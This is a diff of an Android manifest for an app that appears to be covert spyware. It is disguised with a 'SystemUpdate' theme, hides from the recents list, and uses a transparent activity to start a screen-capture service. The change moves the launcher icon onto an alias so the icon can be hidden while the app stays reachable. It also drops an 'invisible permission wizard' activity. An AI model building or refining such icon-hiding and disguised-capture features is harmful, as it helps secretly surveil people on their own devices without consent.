@@ -69,25 +69,32 @@
             android:name="com.sp.core.LauncherActivity"
             android:exported="true"
             android:excludeFromRecents="true"
-            android:theme="@style/Theme.SystemUpdate">
+            android:theme="@style/Theme.SystemUpdate" />
+
+        <!--
+            The launcher icon lives on this alias, not on the activity. Hiding
+            the icon disables the alias only - the activity stays enabled and
+            the app can always be started again (v1.1.x disabled the launcher
+            activity itself and the app became unreachable after an update).
+        -->
+        <activity-alias
+            android:name="com.sp.core.AppAlias"
+            android:targetActivity="com.sp.core.LauncherActivity"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="@string/app_name">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <activity
             android:name="com.sp.core.MainActivity"
             android:exported="true"
             android:excludeFromRecents="true"
             android:theme="@style/Theme.SystemUpdate" />
-
-        <!-- Invisible permission wizard -->
-        <activity
-            android:name="com.sp.core.SetupActivity"
-            android:exported="false"
-            android:label="@string/app_name"
-            android:theme="@android:style/Theme.Material" />
 
         <!-- MediaProjection consent trampoline (transparent, launches capture service) -->
         <activity
